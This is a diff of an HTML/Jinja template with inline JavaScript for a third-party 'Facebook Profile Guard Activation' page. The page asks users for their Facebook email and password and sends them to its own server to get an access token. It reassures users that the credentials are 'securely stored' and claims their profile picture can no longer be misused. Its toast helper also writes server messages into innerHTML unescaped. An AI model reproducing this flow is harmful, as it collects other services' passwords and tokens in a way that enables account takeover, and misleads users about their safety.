@@ -4,144 +4,236 @@
 
 {% block content %}
 <div class="row justify-content-center">
-    <div class="col-lg-8">
+    <div class="col-md-6">
         <div class="card">
             <div class="card-header">
-                <h2 class="text-center"><i class="fas fa-shield-alt"></i> Facebook Profile Guard Activation</h2>
+                <h4><i class="fas fa-shield-alt"></i> Profile Guard Activation</h4>
             </div>
             <div class="card-body">
-                <!-- Step Progress -->
-                <div class="step-progress mb-4">
-                    <div class="step" id="step1">
-                        <div class="step-circle active">1</div>
-                        <div class="step-text">Login</div>
-                    </div>
-                    <div class="step-line"></div>
-                    <div class="step" id="step2">
-                        <div class="step-circle">2</div>
-                        <div class="step-text">Get Token & ID</div>
-                    </div>
-                    <div class="step-line"></div>
-                    <div class="step" id="step3">
-                        <div class="step-circle">3</div>
-                        <div class="step-text">Activate Guard</div>
-                    </div>
-                </div>
-                
-                <!-- Step 1: Login Form -->
-                <div id="loginStep" class="step-content active">
+                <!-- Step 1: Login -->
+                <div id="step1" class="step-content">
+                    <h5 class="text-center mb-4">Enter your Facebook credentials</h5>
                     <form id="loginForm">
-                        <div class="alert alert-info">
-                            <i class="fas fa-info-circle"></i> Your credentials are securely processed to activate the Profile Guard feature.
-                        </div>
                         <div class="mb-3">
-                            <label for="email" class="form-label">Facebook Email or Phone</label>
-                            <div class="input-group">
-                                <span class="input-group-text"><i class="fas fa-envelope"></i></span>
-                                <input type="text" class="form-control" id="email" name="email" required>
-                            </div>
+                            <label for="email" class="form-label">Facebook Email</label>
+                            <input type="email" class="form-control" id="email" name="email" required>
                         </div>
                         <div class="mb-3">
                             <label for="password" class="form-label">Facebook Password</label>
-                            <div class="input-group">
-                                <span class="input-group-text"><i class="fas fa-lock"></i></span>
-                                <input type="password" class="form-control" id="password" name="password" required>
-                                <button class="btn btn-outline-secondary" type="button" id="togglePassword">
-                                    <i class="fas fa-eye"></i>
-                                </button>
-                            </div>
+                            <input type="password" class="form-control" id="password" name="password" required>
+                            <div class="form-text">Your credentials are securely stored and used only for profile guard activation.</div>
                         </div>
-                        <div class="d-grid">
-                            <button type="submit" class="btn btn-primary btn-lg" id="getTokenBtn">
-                                <i class="fas fa-key"></i> Get Access Token
-                            </button>
+                        <div class="d-grid gap-2">
+                            <button type="submit" class="btn btn-primary">Continue</button>
                         </div>
                     </form>
                 </div>
                 
-                <!-- Step 2: Token & ID Display -->
-                <div id="tokenStep" class="step-content">
-                    <div class="alert alert-success">
-                        <i class="fas fa-check-circle"></i> Access token successfully generated!
+                <!-- Step 2: Confirm -->
+                <div id="step2" class="step-content" style="display: none;">
+                    <div class="verification-success mb-4 text-center">
+                        <i class="fas fa-check-circle success-icon"></i>
+                        <h5 class="mt-3">Facebook Account Verified!</h5>
                     </div>
                     
-                    <div class="mb-3">
-                        <label for="accessToken" class="form-label">Access Token</label>
-                        <div class="input-group">
-                            <input type="text" class="form-control" id="accessToken" readonly>
-                            <button class="btn btn-outline-secondary" type="button" id="copyToken">
-                                <i class="fas fa-copy"></i>
-                            </button>
-                        </div>
-                    </div>
+                    <p class="text-center mb-4">
+                        Click below to activate Profile Guard protection on your Facebook account.
+                    </p>
                     
-                    <div class="mb-3">
-                        <label for="userId" class="form-label">Facebook User ID</label>
-                        <div class="input-group">
-                            <input type="text" class="form-control" id="userId" readonly>
-                            <button class="btn btn-outline-secondary" type="button" id="copyId">
-                                <i class="fas fa-copy"></i>
-                            </button>
-                        </div>
-                    </div>
-                    
-                    <div class="d-grid">
-                        <button id="activateGuardBtn" class="btn btn-primary btn-lg">
+                    <div class="d-grid gap-2">
+                        <button id="activateBtn" class="btn btn-success">
                             <i class="fas fa-shield-alt"></i> Activate Profile Guard
                         </button>
                     </div>
                 </div>
                 
-                <!-- Step 3: Completion -->
-                <div id="completionStep" class="step-content">
-                    <div class="text-center">
-                        <div class="success-animation">
-                            <i class="fas fa-shield-alt fa-5x"></i>
-                            <div class="checkmark">
-                                <i class="fas fa-check-circle fa-3x"></i>
-                            </div>
-                        </div>
-                        <h3 class="mt-4">Profile Guard Successfully Activated!</h3>
-                        <p class="lead">Your Facebook profile picture is now protected.</p>
-                        <div class="mt-4">
-                            <a href="{{ url_for('profile_guard') }}" class="btn btn-outline-primary me-2">
-                                <i class="fas fa-redo"></i> Activate Another Account
-                            </a>
-                            <a href="{{ url_for('index') }}" class="btn btn-primary">
-                                <i class="fas fa-home"></i> Return to Home
-                            </a>
-                        </div>
+                <!-- Step 3: Success -->
+                <div id="step3" class="step-content text-center" style="display: none;">
+                    <div class="verification-success mb-4">
+                        <i class="fas fa-check-circle success-icon"></i>
+                        <h5 class="mt-3">Profile Guard Activated!</h5>
                     </div>
-                </div>
-                
-                <!-- Loading Animation -->
-                <div id="loadingOverlay" class="loading-overlay">
-                    <div class="spinner-border text-light" role="status">
-                        <span class="visually-hidden">Loading...</span>
+                    
+                    <p class="mb-4">
+                        Your Facebook profile picture is now protected with Profile Guard. No one can download, share, or misuse your profile picture.
+                    </p>
+                    
+                    <div class="d-grid gap-2">
+                        {% if session.get('user_logged_in') %}
+                        <a href="{{ url_for('user_dashboard') }}" class="btn btn-primary">
+                            <i class="fas fa-arrow-left"></i> Return to Dashboard
+                        </a>
+                        {% else %}
+                        <a href="{{ url_for('index') }}" class="btn btn-primary">
+                            <i class="fas fa-home"></i> Return to Home
+                        </a>
+                        {% endif %}
                     </div>
-                    <p id="loadingText">Processing...</p>
                 </div>
             </div>
         </div>
     </div>
 </div>
+{% endblock %}
 
+{% block extra_js %}
 <script>
-    document.getElementById('togglePassword').addEventListener('click', function() {
-        const passwordInput = document.getElementById('password');
-        const icon = this.querySelector('i');
+    document.addEventListener('DOMContentLoaded', function() {
+        const loginForm = document.getElementById('loginForm');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const activateBtn = document.getElementById('activateBtn');
         
-        if (passwordInput.type === 'password') {
-            passwordInput.type = 'text';
-            icon.classList.remove('fa-eye');
-            icon.classList.add('fa-eye-slash');
-        } else {
-            passwordInput.type = 'password';
-            icon.classList.remove('fa-eye-slash');
-            icon.classList.add('fa-eye');
+        let token = '';
+        let user_id = '';
+        
+        // Handle login form submission
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Show loading state
+            const submitBtn = loginForm.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';
+            submitBtn.disabled = true;
+            
+            // Send request to get token
+            fetch('{{ url_for("profile_guard") }}', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'action': 'get_token',
+                    'email': email,
+                    'password': password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Store token and user_id
+                    token = data.token;
+                    user_id = data.user_id;
+                    
+                    // Show step 2
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                } else {
+                    // Show error
+                    showToast(data.error, 'error');
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showToast('An error occurred. Please try again.', 'error');
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            });
+        });
+        
+        // Handle activation button
+        activateBtn.addEventListener('click', function() {
+            // Show loading state
+            const originalText = activateBtn.innerHTML;
+            activateBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Activating...';
+            activateBtn.disabled = true;
+            
+            // Send request to activate guard
+            fetch('{{ url_for("profile_guard") }}', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'action': 'activate_guard',
+                    'token': token,
+                    'user_id': user_id
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Show success message
+                    step2.style.display = 'none';
+                    step3.style.display = 'block';
+                    showToast('Profile Guard activated successfully!', 'success');
+                } else {
+                    // Show error
+                    showToast(data.error, 'error');
+                    activateBtn.innerHTML = originalText;
+                    activateBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showToast('An error occurred. Please try again.', 'error');
+                activateBtn.innerHTML = originalText;
+                activateBtn.disabled = false;
+            });
+        });
+        
+        // Helper function to show toast
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.classList.add('toast', 'show', `bg-${type === 'error' ? 'danger' : type}`);
+            toast.setAttribute('role', 'alert');
+            toast.setAttribute('aria-live', 'assertive');
+            toast.setAttribute('aria-atomic', 'true');
+            
+            toast.innerHTML = `
+                <div class="toast-header">
+                    <strong class="me-auto">${type === 'error' ? 'Error' : 'Success'}</strong>
+                    <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+                </div>
+                <div class="toast-body text-white">
+                    ${message}
+                </div>
+            `;
+            
+            const toastContainer = document.createElement('div');
+            toastContainer.style.position = 'fixed';
+            toastContainer.style.top = '20px';
+            toastContainer.style.right = '20px';
+            toastContainer.style.zIndex = '9999';
+            
+            toastContainer.appendChild(toast);
+            document.body.appendChild(toastContainer);
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    document.body.removeChild(toastContainer);
+                }, 500);
+            }, 5000);
         }
     });
-    
-    // Step handling and form submission will be in script.js
 </script>
+{% endblock %}
+
+{% block extra_css %}
+<style>
+    /* Success verification styling */
+    .verification-success {
+        margin: 20px 0;
+    }
+    
+    .success-icon {
+        font-size: 60px;
+        color: #00E5FF;
+        text-shadow: 0 0 15px rgba(0, 229, 255, 0.8);
+    }
+    
+    /* Toast styling */
+    .toast {
+        border: none;
+        box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
+    }
+</style>
 {% endblock %}
